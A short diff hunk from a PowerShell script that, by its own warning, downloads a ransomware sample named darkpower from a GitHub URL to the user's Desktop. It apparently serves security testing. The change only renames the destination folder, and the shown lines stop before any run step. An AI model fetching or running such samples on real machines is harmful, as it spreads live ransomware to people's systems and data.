@@ -15,7 +15,7 @@ if (Test-Path -Path $Folder) {
     "******** Will download ransomware - DANGEROUS **************"
     $URL = 'https://github.com/PoesRaven/public/raw/master/darkpower.zip'
     $SamplePath = $HOME + '/Desktop/darkpower.zip'
-    $DestinationPath = $HOME + '/Desktop/darkpower'
+    $DestinationPath = $HOME + '/Desktop/ransomware'
     $File = 'darkpower.exe'
     $FullFile = $DestinationPath + '\' + $File
     "Grabbing file"
